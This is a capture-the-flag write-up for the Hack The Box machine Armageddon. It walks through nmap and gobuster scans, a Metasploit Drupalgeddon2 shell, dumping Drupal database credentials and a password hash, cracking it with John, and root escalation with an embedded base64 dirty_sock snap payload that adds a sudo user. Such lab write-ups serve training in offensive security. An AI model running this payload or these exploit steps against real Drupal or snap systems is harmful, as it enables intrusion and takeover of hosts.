First what we nned to do is RECON, to recognaiz what's running on the server! Let's start with nmap 

```
┌──(kali㉿kali)-[~]
└─$ nmap -sCV 10.10.10.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 12:20 EDT
Nmap scan report for 10.10.10.233
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
```

We can't see there any intresting port, only standard port SSH and HTTP
I turn on the gobuster, found robots.txt but there is any intresting directory/information

Here's results from gobuster
```
/.hta                 (Status: 403) [Size: 206]
/.hta.php             (Status: 403) [Size: 210]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htaccess.php        (Status: 403) [Size: 215]
/cgi-bin/             (Status: 403) [Size: 210]
/cron.php             (Status: 403) [Size: 7388]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/index.php            (Status: 200) [Size: 7440]
/index.php            (Status: 200) [Size: 7440]
/install.php          (Status: 200) [Size: 3172]
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/robots.txt           (Status: 200) [Size: 2189]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/update.php           (Status: 403) [Size: 4057]
/web.config           (Status: 200) [Size: 2200]
/xmlrpc.php           (Status: 200) [Size: 42]
/xmlrpc.php           (Status: 200) [Size: 42]
```
But in directory /install.php i found more istresting think ```Drupal already installed``` i found some intresting modul in metasploit ```exploit(unix/webapp/drupal_drupalgeddon2)``` and i insert missing data RHOST, LHOST and i got the meterpreter.

![obraz](https://github.com/Anogota/Armageddon/assets/143951834/304bc908-e3b7-49ed-9cbd-efa733b25d7b)

in the meterpreter i wrote shell and i got it ```id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0``` i found something intresting on hacktricks about the drupal how to dump all database, but i need the password to dump it. I found the password on the server.
Here you can find the creds /var/www/html/sites/default/settings.php
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
Now when we have the password we can try to dump the database
```
mysql -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'use drupal; select * from users'
```
and i got the username and hash 
```
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```
Let's crack this hash with help johntheripper
```echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' >> hash.txt```
```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
And you got the password ```booboo```
Now let's log in into SSH with this creds.
Here's the flag for user

![obraz](https://github.com/Anogota/Armageddon/assets/143951834/b20131fa-aa35-40c6-9037-2116ba66d52f)

Let's try to escalate this into the root.
First what we need to do is sudo -l
```
(root) NOPASSWD: /usr/bin/snap install *
```
Let's try to search something about snap. On this website i found how to escalate snap https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html
```
python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d
```
```
su dirty_sock
```
The password is the same like the username.
The last step is: ```sudo -i``` And you have a sudo rights here's the flag. ![obraz](https://github.com/Anogota/Armageddon/assets/143951834/3363dfaa-8bc2-441d-9dc2-a669408773f0)

